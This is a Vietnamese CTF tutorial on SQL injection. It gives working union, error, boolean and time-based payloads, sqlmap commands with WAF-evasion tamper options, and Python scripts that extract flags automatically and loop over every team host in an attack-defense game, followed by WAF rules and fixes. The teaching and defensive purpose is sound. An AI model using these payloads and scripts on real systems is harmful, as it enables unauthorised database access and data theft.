SQL Injection (SQLi)

Khi một trang web lấy dữ liệu bạn gõ vào (ô tìm kiếm, link, form đăng nhập...) rồi dán thẳng vào câu lệnh hỏi cơ sở dữ liệu — bạn có thể "nói chuyện trực tiếp" với cơ sở dữ liệu đó, đọc được bảng mà lẽ ra bạn không được xem, kể cả bảng chứa flag.

00 / TÓM TẮT 1 PHÚT

SQLi là gì, để làm gì?

Trang web thường lưu dữ liệu (user, bài viết, flag...) trong một cơ sở dữ liệu (database) — nghĩ đơn giản như một cuốn sổ bảng tính khổng lồ. Khi bạn gõ gì đó vào ô tìm kiếm, server phải "hỏi" cuốn sổ đó một câu bằng ngôn ngữ riêng gọi là SQL. Nếu server ghép thẳng chữ bạn gõ vào câu hỏi đó mà không kiểm tra, bạn có thể gõ ra một câu SQL khác hẳn ý đồ ban đầu — ép cuốn sổ trả lời đúng cái bạn muốn, kể cả dữ liệu của người khác hoặc bảng chứa flag.

Nếu chỉ nhớ một điều SQLi xảy ra vì server không phân biệt được "chữ bạn gõ là dữ liệu" với "chữ bạn gõ là lệnh". Dấu nháy đơn ' là chìa khóa: nó thường là ký tự dùng để đóng một chuỗi dữ liệu trong SQL — gõ đúng chỗ, bạn "thoát" ra khỏi vai trò dữ liệu và viết tiếp lệnh của riêng mình.

✅ Tiền đề cần có Tham số đó thực sự đi vào một câu truy vấn SQL (không phải NoSQL/file). Biết được kết quả truy vấn có hiện ra màn hình không (union/error-based) hay phải đoán qua true/false (blind).

01 / NỀN TẢNG BẮT BUỘC

Những thứ cần hiểu trước khi đọc tiếp

HTTP request — mỗi khi trình duyệt (hoặc script của bạn) muốn lấy/gửi gì tới server, nó gửi một "lá thư" gọi là request. Lá thư này có: method (GET để xin dữ liệu, POST để gửi dữ liệu lên), URL (địa chỉ trang), param (tham số, ví dụ ?id=5 — giá trị 5 là param), và đôi khi có body (phần nội dung gửi kèm, như dữ liệu form đăng nhập).
HTTP response — "thư trả lời" từ server: có status code (200 = OK, 500 = lỗi server, 404 = không tìm thấy...) và body (nội dung HTML/JSON bạn thấy trên trang).
Database (cơ sở dữ liệu) — nơi server lưu trữ dữ liệu có cấu trúc, chia thành các bảng (table) (giống 1 sheet Excel), mỗi bảng có nhiều cột (column) và nhiều dòng (row). Ví dụ bảng users có cột id, username, password.
SQL (Structured Query Language) — ngôn ngữ để "hỏi chuyện" với database. Câu hỏi cơ bản nhất: SELECT cột FROM bảng WHERE điều_kiện — nghĩa là "lấy ra những cột này, từ bảng này, với điều kiện này".

Ví dụ: trang web có chức năng xem sản phẩm theo ID. Khi bạn vào /item?id=5, server ở phía sau (code PHP/Python/Node...) sẽ chạy một câu SQL kiểu:

SELECT name, price FROM products WHERE id = 5

Server lấy số 5 trực tiếp từ param id trên URL bạn gõ, rồi dán thẳng vào chỗ đáng lẽ là "điều kiện". Đây chính là chỗ hở.

02 / VÌ SAO LỖ HỔNG TỒN TẠI

Lập trình viên định làm gì, sơ hở ở đâu?

Lập trình viên muốn: "lấy sản phẩm có ID đúng bằng số người dùng chọn". Cách viết code sai nhưng rất phổ biến (đặc biệt ở các challenge CTF dựng nhanh) là nối chuỗi trực tiếp:

# Python (giả định, kiểu code dễ gặp trong challenge)
id = request.args.get("id")          # lấy nguyên văn từ URL, vd: "5"
query = f"SELECT name, price FROM products WHERE id = {id}"
cursor.execute(query)

Vấn đề: biến id được ghép thẳng vào chuỗi câu lệnh bằng f-string/nối chuỗi, thay vì được database hiểu là "chỉ là một giá trị dữ liệu". Database không có cách nào phân biệt "đây là số 5 người dùng nhập" với "đây là một đoạn lệnh SQL mới" — nó chỉ thấy toàn bộ chuỗi và chạy y nguyên.

Vì sao điều này nguy hiểm: SQL dùng dấu nháy đơn ' để đánh dấu bắt đầu/kết thúc một chuỗi text. Nếu tham số là kiểu text (ví dụ ô tìm kiếm tên sản phẩm), câu lệnh sẽ là:

SELECT * FROM products WHERE name = 'laptop'

Nếu bạn gõ vào ô tìm kiếm chữ laptop' OR '1'='1, server ghép ra:

SELECT * FROM products WHERE name = 'laptop' OR '1'='1'

Dấu ' đầu tiên trong input của bạn đã đóng sớm chuỗi 'laptop, biến phần còn lại OR '1'='1 thành code SQL thật được database thực thi, không còn là dữ liệu nữa.

03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI

Request độc → server hiểu sai → hậu quả

Ví dụ bằng số thật đi hết chuỗi: giả sử bảng products có 3 cột (id, name, price), và có một bảng khác tên flags với 1 cột flag chứa chuỗi FHACKER2026{...}.

Bước 1 — đếm số cột. Gõ id=1' ORDER BY 3-- -: trang vẫn hiện bình thường (vì bảng có ít nhất 3 cột). Gõ id=1' ORDER BY 4-- -: trang báo lỗi "Unknown column '4'" ⟹ bảng đúng 3 cột.

Bước 2 — ghép UNION. UNION SELECT cho phép "dán thêm" kết quả của một câu SELECT khác vào ngay sau kết quả gốc, miễn là số cột khớp nhau (ở đây là 3). Ta không cần biết tên cột thật của products, chỉ cần điền đủ 3 giá trị:

id=0 UNION SELECT 1, flag, 3 FROM flags-- -
0 UNION SELECT 1, flag, 3 FROM flags-- -
0 — ID giả, cố tình sai để câu SELECT gốc không trả dòng nào (tránh lẫn dữ liệu gốc vào, dễ đọc kết quả).
UNION SELECT 1, flag, 3 — nối thêm 1 dòng kết quả giả, đúng 3 cột: cột 1 là số 1 (giá trị rác, không quan trọng), cột 2 là flag (cột thật từ bảng khác — đây là nơi dữ liệu bị đánh cắp hiện ra), cột 3 là số 3 (rác).
FROM flags — lấy dữ liệu từ bảng flags thay vì products.
-- - — comment, "nuốt" phần còn lại của câu lệnh gốc server đã viết sẵn phía sau (thường là dấu ngoặc đóng hoặc điều kiện thừa), tránh gây lỗi cú pháp.
Response mong đợi: thay vì tên/giá sản phẩm, trang hiện ra một dòng có chữ FHACKER2026{...64 ký tự hex...} ở đúng vị trí cột 2 từng hiện name.
04 / NHẬN DIỆN KHI GẶP CHALLENGE

Bảng dấu hiệu — thấy gì thì nghi SQLi

Dấu hiệu quan sát đượcÝ nghĩa
URL có ?id=, ?search=, ?category=... Tham số rất có thể đi thẳng vào câu WHERE.
Gõ ' vào ô input → trang lỗi 500 / thông báo kiểu "SQL syntax error" Chắc chắn param đi vào SQL mà không được lọc dấu nháy.
Gõ ' OR '1'='1 vào ô đăng nhập → đăng nhập thành công dù sai mật khẩu SQLi trong câu truy vấn kiểm tra đăng nhập.
Trang không báo lỗi, nhưng nội dung đổi khi gõ 1 AND 1=1 vs 1 AND 1=2 Boolean-based blind SQLi (không lộ lỗi nhưng vẫn khai thác được).
Trang phản hồi chậm hẳn khi thêm AND SLEEP(5) Time-based blind SQLi (dùng khi không có khác biệt nào quan sát được khác).
Cách chọc thử nhanh (Combat Card mục 🚩) Thứ tự thử: ' → ' OR '1'='1 → ' ORDER BY 10-- -. Chỉ cần 3 lần gõ là biết gần như chắc chắn có SQLi hay không.
05 / KHAI THÁC BẰNG BURP SUITE

Burp Suite là gì, và bấm gì (từng bước)

Burp Suite — một chương trình đứng giữa trình duyệt của bạn và server, cho phép bạn xem và sửa mọi request trước khi nó thực sự được gửi đi. Nghĩ như việc bạn chặn một lá thư giữa đường, đọc nó, sửa vài chữ, rồi mới cho nó đi tiếp.
Bước 1 — bắt request
  1. Mở Burp Suite → tab Proxy → Intercept → bấm cho nó hiện "Intercept is on".
  2. Vào Settings của trình duyệt, đặt proxy HTTP thành 127.0.0.1:8080 (cổng mặc định của Burp).
  3. Trên web, mở trang challenge, gõ ID sản phẩm bất kỳ (ví dụ 1) rồi bấm xem/tìm kiếm.
  4. Request bị Burp giữ lại — bạn sẽ thấy nó hiện trong tab Proxy, dạng text giống GET /item?id=1 HTTP/1.1.
Bước 2 — gửi sang Repeater để sửa & gửi lại nhiều lần
  1. Chuột phải vào request đang bị giữ → chọn Send to Repeater.
  2. Chuyển sang tab Repeater (nó đã tự mở request bạn vừa gửi sang).
  3. Sửa trực tiếp trong khung request: đổi id=1 thành id=1' ORDER BY 3-- -.
  4. Bấm nút Send (hoặc Ctrl+Enter).
  5. Đọc panel Response bên phải: nếu thấy status 200 và trang bình thường ⟹ có ít nhất 3 cột. Đổi số lên 4, Send lại, nếu giờ thấy lỗi SQL hoặc status 500 ⟹ đúng 3 cột.
  6. Sửa tiếp thành payload UNION đầy đủ, bấm Send, đọc flag ngay trong Response.
Lợi ích của Repeater: bạn sửa-gửi-đọc lặp đi lặp lại rất nhanh mà không cần gõ lại cả URL mỗi lần trên trình duyệt.
Khi nào cần Intruder (tự động dò nhiều giá trị) Dùng Repeater khi bạn tự tay thử từng payload một (như trên). Dùng Intruder khi cần lặp qua rất nhiều giá trị tự động — ví dụ đếm số cột mà không muốn gõ tay ORDER BY 1,2,3...20:
  1. Send to Intruder (chuột phải request trong Proxy/Repeater).
  2. Trong tab Positions: xóa hết dấu § mặc định, chỉ đánh dấu đúng vị trí con số trong ORDER BY §1§.
  3. Tab Payloads: chọn loại Numbers, từ 1 tới 20.
  4. Bấm Start attack. Sắp xếp kết quả theo cột Length hoặc Status code — dòng nào khác biệt (ví dụ length giảm hẳn, status đổi từ 200→500) chính là số cột bạn cần.
06 / PAYLOAD ĐẦY ĐỦ THEO BIẾN THỂ

Chọn đúng kỹ thuật theo tình huống

A. Union-based dễ nhất, thử trước

Dùng khi: kết quả truy vấn hiện ra trực tiếp trên trang (bạn thấy tên sản phẩm, giá...).

BướcPayloadMục đích
1. Xác nhận lỗ hổng'Gây lỗi cú pháp SQL → xác nhận input đi vào SQL
2. Đếm cột' ORDER BY n-- -Tăng dần n tới khi lỗi ⟹ số cột = n-1
3. Tìm cột hiện ra màn hình' UNION SELECT 1,2,3-- -Xem số nào xuất hiện trên trang (đó là cột "hiện được")
4. Lấy dữ liệu' UNION SELECT 1,flag,3 FROM flags-- -Thay số ở cột hiện được bằng cột thật muốn đọc
5. Liệt kê bảng (không biết tên bảng)' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -MySQL/Postgres: bảng hệ thống chứa tên mọi bảng khác
6. Liệt kê cột của 1 bảng' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='flags'-- -Biết tên bảng rồi, giờ xem nó có cột gì

B. Error-based khi muốn ép lỗi hiển thị dữ liệu

Dùng khi: trang không hiện kết quả SELECT trực tiếp, nhưng có hiện thông báo lỗi chi tiết của database (MySQL hay bị vậy).

' AND extractvalue(1, concat(0x7e, (SELECT flag FROM flags LIMIT 1)))-- -
extractvalue(1, chuỗi) — một hàm MySQL dùng để xử lý XML, nhưng nếu chuỗi không phải XML hợp lệ, MySQL sẽ ném lỗi và in luôn chuỗi đó ra thông báo lỗi — ta lợi dụng để "ép" database tự in flag ra ngoài qua message lỗi.
concat(0x7e, ...) — nối thêm ký tự ~ (mã hex 0x7e) vào đầu, chỉ để dễ nhận ra điểm bắt đầu dữ liệu trong thông báo lỗi.

C. Boolean-based Blind khi không có union, không có error hiện ra

Dùng khi: trang trông giống hệt nhau dù query đúng hay sai, trừ một chi tiết nhỏ (có/không có 1 dòng chữ, redirect khác, độ dài trang khác vài ký tự).

# Xác nhận blind hoạt động
' AND 1=1-- -      # true -> trang như bình thường
' AND 1=2-- -      # false -> trang khác đi (thiếu 1 phần, trống...)

# Suy ra từng ký tự của flag (đoán nhị phân)
' AND SUBSTRING((SELECT flag FROM flags LIMIT 1),1,1)='F'-- -
Nguyên lý: thử lần lượt từng ký tự có thể có (a-z, 0-9...) ở từng vị trí trong chuỗi flag. Vị trí nào server trả "true" (trang như bình thường) → đúng ký tự đó. Lặp lại cho tới hết độ dài flag. Việc này bắt buộc phải tự động hóa bằng script (xem mục 07) vì phải thử hàng trăm lần.

D. Time-based Blind khi response không khác gì cả

Dùng khi: ngay cả boolean-blind cũng không phân biệt được response (ví dụ server luôn trả về y hệt một trang "cảm ơn"). Lúc đó dùng thời gian phản hồi làm tín hiệu true/false.

DBPayload mẫu
MySQL' AND IF(SUBSTRING((SELECT flag FROM flags LIMIT 1),1,1)='F',SLEEP(3),0)-- -
PostgreSQL'; SELECT CASE WHEN SUBSTRING((SELECT flag FROM flags LIMIT 1),1,1)='F' THEN pg_sleep(3) ELSE pg_sleep(0) END--
SQLitekhông có SLEEP trực tiếp — thường khai thác qua truy vấn tốn CPU lặp (hiếm gặp trong CTF, ưu tiên union/error trước)

07 / CÔNG CỤ THỰC CHIẾN: SQLMAP & KHO PAYLOAD

Không nhớ nổi payload? Đừng cố nhớ — tra và tự động hóa

Không ai nhớ hết payload cho mọi DB/tình huống, và cũng không cần phải nhớ. Khi vào phòng thi (không có Internet), bạn có 2 vũ khí offline: một kho payload để tra khi bí, và một công cụ tự động khai thác làm phần nặng thay bạn. Dùng đúng thứ tự: sqlmap trước để tìm nhanh + xác nhận injection, kho payload chỉ để tra khi sqlmap không đủ hoặc bạn cần hiểu nó đang làm gì.

A. Kho payload offline — PayloadsAllTheThings

PayloadsAllTheThings — một kho (repo) chứa sẵn payload mẫu cho hầu hết mọi loại lỗ hổng web, chia theo từng chủ đề. Đây không phải công cụ tự chạy, chỉ là "cuốn từ điển" để bạn mở ra tra khi bí ý tưởng — giống việc tra từ điển khi quên một từ tiếng Anh.

B. sqlmap — tự động dò và khai thác

sqlmap — công cụ dòng lệnh tự động: bạn đưa nó 1 request, nó tự thử hàng trăm payload (union/error/blind/time) trên mọi tham số, tự nhận diện DB, rồi tự liệt kê database/bảng/cột/dữ liệu — việc mà làm tay ở mục 06-07 cũ sẽ rất lâu. Đã cài sẵn trên máy, gõ sqlmap --version để kiểm tra.
Bước 1 — lấy request đã bắt từ Burp Trong Burp (đã bắt request ở mục 05), chuột phải request trong tab Proxy hoặc Repeater → Save item → lưu thành file, ví dụ req.txt. File này chứa nguyên văn request (method, URL, header, body) — sqlmap đọc trực tiếp được, không cần gõ lại URL/tham số bằng tay.
Bước 2 — chạy sqlmap với request file 
# Dò + xác nhận có injection không, liệt kê database
sqlmap -r req.txt --batch --dbs

# Đã biết tên database (vd "ctf"), liệt kê bảng
sqlmap -r req.txt --batch -D ctf --tables

# Liệt kê cột của bảng "flags"
sqlmap -r req.txt --batch -D ctf -T flags --columns

# Dump thẳng cột "flag" (nhanh hơn dump cả bảng)
sqlmap -r req.txt --batch -D ctf -T flags -C flag --dump
FlagÝ nghĩa
-r req.txtĐọc toàn bộ request từ file (thay vì phải gõ -u URL --data ... tay)
--batchLuôn thêm flag này khi tự động hóa — sqlmap tự trả lời "có" mọi câu hỏi tương tác, không đứng lại chờ bạn gõ Enter
-p THAM_SOChỉ định đúng tham số nghi ngờ (dùng khi request có nhiều tham số, sqlmap tự dò nhầm chỗ khác)
--dbms=mysqlÉp sqlmap chỉ thử cú pháp MySQL (biết trước DB ở mục 04/06) → nhanh hơn hẳn vì bỏ qua dò các DB khác
--technique=UÉp chỉ dùng kỹ thuật Union (U=union, B=boolean, E=error, T=time) — nhanh hơn khi đã biết loại nào ăn
--level=3 --risk=2Tăng độ sâu thử (mặc định 1/1) khi payload mặc định không phát hiện ra injection
--proxy=http://127.0.0.1:8080Cho sqlmap gửi request qua Burp — để bạn nhìn thấy từng request nó gửi, học được payload nó dùng
Khi WAF chặn sqlmap Dùng tamper script để biến đổi payload né filter (xem danh sách đầy đủ: sqlmap --list-tampers): 
# vd: khoảng trắng bị chặn -> đổi thành comment /**/
sqlmap -r req.txt --batch --tamper=space2comment

# vd: chữ hoa/thường bị chặn theo pattern cố định -> trộn ngẫu nhiên
sqlmap -r req.txt --batch --tamper=randomcase,space2comment
Giới hạn của sqlmap trong Attack-Defense — vì sao vẫn cần script riêng sqlmap rất mạnh nhưng chậm (thử nhiều kỹ thuật, nhiều request mỗi lần chạy) — không hợp để lặp qua 10-20 đội mỗi round chỉ trong vài phút. Workflow đúng cho A/D:
  1. Dùng sqlmap 1 lần trên service của chính đội bạn (round đầu, hoặc lúc rảnh) để xác nhận có injection + tìm ra tên bảng/cột chứa flag.
  2. Copy đúng payload sqlmap đã xác nhận ăn (xem nó in ra trong log, hoặc tự ráp lại dựa trên tên bảng/cột đã tìm được) vào script Python nhẹ ở mục 08 — chạy nhanh, lặp hết các đội mỗi round.

C. Không có/không muốn dùng sqlmap? Script tự quét nhẹ

Nếu sqlmap bị cấm mang vào, bị lỗi, hoặc bạn muốn kiểm soát hoàn toàn, dùng script tự dò đơn giản sau — kém mạnh hơn sqlmap rất nhiều (không tự tìm tên bảng/cột, không có tamper) nhưng đủ để xác nhận nhanh tham số nào dính injection trước khi tự ráp payload bằng tay (mục 06):

import requests, time

def auto_scan_param(url, param, baseline_value="1"):
    """Thử nhanh error-based + boolean-blind + time-blind trên 1 tham số."""
    base = requests.get(url, params={param: baseline_value}, timeout=5)

    # 1) Error-based: gõ dấu nháy, xem status/độ dài đổi khác hẳn
    r = requests.get(url, params={param: baseline_value + "'"}, timeout=5)
    if r.status_code != base.status_code or abs(len(r.text) - len(base.text)) > 50:
        print(f"[{param}] nghi ERROR-BASED (status {base.status_code}->{r.status_code})")

    # 2) Boolean-blind: so sánh true vs false
    t = requests.get(url, params={param: f"{baseline_value}' AND 1=1-- -"}, timeout=5)
    f = requests.get(url, params={param: f"{baseline_value}' AND 1=2-- -"}, timeout=5)
    if len(t.text) != len(f.text):
        print(f"[{param}] nghi BOOLEAN-BLIND (len true={len(t.text)}, false={len(f.text)})")

    # 3) Time-blind: đo thời gian phản hồi khi có/không SLEEP
    t0 = time.time()
    requests.get(url, params={param: f"{baseline_value}' AND SLEEP(3)-- -"}, timeout=8)
    elapsed = time.time() - t0
    if elapsed > 2.5:
        print(f"[{param}] nghi TIME-BLIND (mất {elapsed:.1f}s)")

auto_scan_param("http://TARGET/item", "id")
Mức tự động của script này — đọc kỹ để khỏi nhầm Đầu vào bạn đưa: chỉ URL + tên tham số (vd "id") — không cần biết payload trước, 3 payload test (dấu nháy, AND 1=1/1=2, SLEEP(3)) đã viết sẵn trong hàm. Đầu ra: chỉ in dòng "nghi X" — nó không tự tìm ra flag, vì muốn lấy flag thật phải biết tên bảng/cột chứa flag, mà script này không tự dò ra được tên đó.
→ Dùng xong script này (biết "có SQLi, loại gì") thì vẫn phải qua sqlmap hoặc tay (mục 06) để tìm tên bảng/cột, rồi mới viết được payload thật để đưa vào script mục 08 bên dưới — mục 08 thì ngược lại: bạn phải tự gõ payload đã biết vào, nó không tự scan gì cả, chỉ lo lặp nhanh qua nhiều đội và trích flag bằng regex.

(B) Bản gọn chắc — dùng thực chiến, trích thẳng flag

import re, requests

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-f]{64}\}")

def exploit_sqli(host):
    url = f"http://{host}/item"
    r = requests.get(url, params={"id": "0 UNION SELECT 1,flag,3 FROM flags-- -"}, timeout=5)
    m = FLAG_RE.search(r.text)
    return m.group() if m else None

flag = exploit_sqli("TARGET_IP")

(C) Bản A/D tái dùng — chạy mọi đội, mọi round

import re, requests, sys

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-f]{64}\}")
PAYLOAD = "0 UNION SELECT 1,flag,3 FROM flags-- -"

def exploit_sqli(host):
    try:
        r = requests.get(f"http://{host}/item", params={"id": PAYLOAD}, timeout=5)
        m = FLAG_RE.search(r.text)
        return m.group() if m else None
    except requests.RequestException:
        return None   # service đội đó có thể đang down/reset round -> bỏ qua, không crash

if __name__ == "__main__":
    # teams.txt: mỗi dòng 1 IP đội, lấy từ BTC
    for host in open("teams.txt").read().split():
        flag = exploit_sqli(host)
        if flag:
            print(f"{host} {flag}")
            with open("flags.txt", "a") as f:
                f.write(f"{flag}\n")
Bắt buộc với A/DCó timeout, bắt lỗi mạng (service đội khác có thể đang bị đội khác tấn công/đang reset), ghi flag ra file để script nộp flag (riêng, có throttle ≤30 lần/phút) đọc lại — không gộp 2 việc khai thác và nộp flag vào 1 script.

Script blind SQLi (đoán từng ký tự) — khi không dùng được union

import requests, string

def is_true(host, condition):
    r = requests.get(f"http://{host}/item",
            params={"id": f"1' AND {condition}-- -"}, timeout=5)
    return "Price" in r.text   # chữ chỉ xuất hiện khi điều kiện true, thay theo challenge thật

def extract_flag(host, max_len=70):
    flag = ""
    charset = string.ascii_letters + string.digits + "{}_-"
    for pos in range(1, max_len + 1):
        for ch in charset:
            cond = f"SUBSTRING((SELECT flag FROM flags LIMIT 1),{pos},1)='{ch}'"
            if is_true(host, cond):
                flag += ch
                print(flag, end="\r")
                break
        else:
            break   # không ký tự nào khớp -> đã hết flag
    return flag

print(extract_flag("TARGET_IP"))
09 / VÍ DỤ THỰC TẾ END-TO-END

Từ nhận service tới lấy flag

Giả sử bạn nhận một service web, trang chủ có ô tìm kiếm sản phẩm theo tên, URL dạng /search?q=laptop.

1
Recon
Xem HTML: có form tìm kiếm GET, param tên q. Thử gõ chữ thường, trang hiện danh sách sản phẩm khớp tên.
2
Nhận diện
Burp bắt request GET /search?q=laptop, Send to Repeater, sửa q=laptop' → Response: status 500, body chứa "You have an error in your SQL syntax" ⟹ xác nhận SQLi, và lộ luôn đây là MySQL.
3
Đếm cột
Sửa thành q=laptop' ORDER BY 1-- -, tăng dần. Tới ORDER BY 3 vẫn OK, ORDER BY 4 lỗi ⟹ 3 cột.
4
Tìm cột hiện ra
q=nope' UNION SELECT 1,2,3-- - (chữ "nope" để query gốc không trả dòng thật nào, dễ nhìn). Trang hiện ra số 2 ở vị trí tên sản phẩm ⟹ cột 2 là cột hiển thị.
5
Lấy flag
q=nope' UNION SELECT 1,flag,3 FROM flags-- - → Response hiện dòng sản phẩm giả với "tên sản phẩm" chính là FHACKER2026{64 ký tự hex}.
6
Tự động hóa
Dán payload đã xác nhận vào bản script (C) ở mục 07, chạy qua danh sách IP các đội, ghi flag ra file.
10 / PHÒNG THỦ: VIẾT WAF RULE

Chặn đúng payload, không chặn nhầm request thường

Rule (regex)Khớp gì
(?i)union\s+selectMọi biến thể hoa/thường của UNION SELECT, kể cả có nhiều khoảng trắng
(?i)'\s*(or|and)\s+'?\d' OR 1, ' AND 1... (bắt đầu phá điều kiện WHERE)
(?i)sleep\s*\(|pg_sleep\s*\(|benchmark\s*\(Time-based blind payload
information_schemaDò cấu trúc database (bảng/cột)
Tránh chặn nhầm (quy chế A/D) Không chặn mọi dấu ' (sẽ chặn luôn tên như O'Brien hợp lệ). Không viết rule quá rộng kiểu .*select.* (chặn cả request bình thường có chữ "select" trong tên sản phẩm). Luôn bật DetectionOnly trước, xem log traffic thật, chắc chắn không bắt nhầm request hợp lệ rồi mới chuyển sang chế độ chặn thật (block).
MẹoRule theo payload cụ thể vừa khai thác được (như union\s+select) luôn an toàn hơn rule "đoán trước" chung chung — vì bạn đã biết chính xác payload nào mình/đối thủ cần dùng.

12 / NHẬN DIỆN & GIỚI HẠN

Khi nào ĐƯỢC / KHÔNG dùng

Tình huống
✅Tham số đi thẳng vào câu SQL bằng nối chuỗi (f-string, +, % format) — đa số challenge CTF cố ý viết kiểu này.
✅App dùng ORM nhưng vẫn có chỗ gọi raw SQL (.raw(), execute() thủ công) kèm nối chuỗi.
❌App dùng prepared statement / parameterized query đúng cách (tham số truyền qua ? hoặc %s riêng biệt, không nối chuỗi) — đây là cách vá chuẩn, SQLi không khai thác được nữa.
❌Input được ép kiểu số nghiêm ngặt trước khi vào query (ví dụ int(request.args.get("id")) ở Python) — không còn chỗ nhét ký tự '.
Nếu SQLi không ăn, kiểm tra xem challenge có đang dùng ORM (SQLAlchemy, Django ORM...) đúng cách không — lúc đó nên chuyển hướng tìm lỗ hổng khác (IDOR, SSTI...) thay vì cố khai thác SQLi.
13 / BÀI TẬP & THUẬT NGỮ

Luyện tập

⭐ Làm lại: dựng lại ví dụ mục 08 bằng tay trên Burp, từ bước recon tới khi thấy flag trong Response.

Gợi ý nếu kẹtNhớ đổi điều kiện gốc thành chắc chắn sai trước khi UNION, nếu không 2 bộ dữ liệu sẽ lẫn vào nhau khó đọc.

⭐⭐ Đổi 1 biến: giả sử challenge không hiện UNION ra màn hình (chỉ có "Tìm thấy" / "Không tìm thấy"), hãy viết script boolean-blind trích flag bằng mục 07.

Gợi ý nếu kẹtTìm đúng chuỗi phân biệt true/false bằng Burp trước (so sánh 2 response của 1=1 và 1=2) rồi mới đưa vào script.

⭐⭐⭐⭐ Tự nghĩ: challenge dùng PostgreSQL, lọc chặn chữ UNION (không phân biệt hoa thường) và khoảng trắng kép. Viết payload union-based vượt qua bộ lọc này.

Gợi ý nếu kẹtKết hợp: đổi hoa-thường (UnIoN) + dùng comment /**/ thay khoảng trắng.
